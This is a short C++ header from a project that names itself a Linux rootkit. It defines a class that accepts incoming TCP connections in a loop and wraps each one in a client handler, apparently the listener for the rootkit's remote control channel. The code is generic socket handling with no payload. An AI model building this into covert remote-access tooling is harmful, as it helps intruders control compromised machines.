//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_LINUX_TCP_PORT_CONNECTION_ESTABLISHER_H
#define ROOTKIT_LINUX_TCP_PORT_CONNECTION_ESTABLISHER_H

#include "basic_tcp_port_listener.h"
#include "../linux_client_handler.h"

#include <sys/socket.h>
#include <arpa/inet.h>

class linux_tcp_port_connection_establisher : public basic_tcp_port_listener::basic_connection_establisher{
protected:
    int socket_fd;

public:
    explicit linux_tcp_port_connection_establisher(int socketFd) : socket_fd(socketFd) {}

    std::unique_ptr<basic_client_handler> operator()() override {
        while (1) {
            int client_sd;
            struct sockaddr_in client_addr;

            // accepting a new client
            socklen_t len = sizeof(client_addr);
            client_sd = accept(
                    socket_fd,
                    (struct sockaddr *) &client_addr,
                    &len
            );
#define ACCEPT_ERROR (-1)
            if (client_sd == ACCEPT_ERROR) // can't accept the client
                continue;

            return std::make_unique<linux_client_handler>(client_sd);
        }
    }
};


#endif //ROOTKIT_LINUX_TCP_PORT_CONNECTION_ESTABLISHER_H
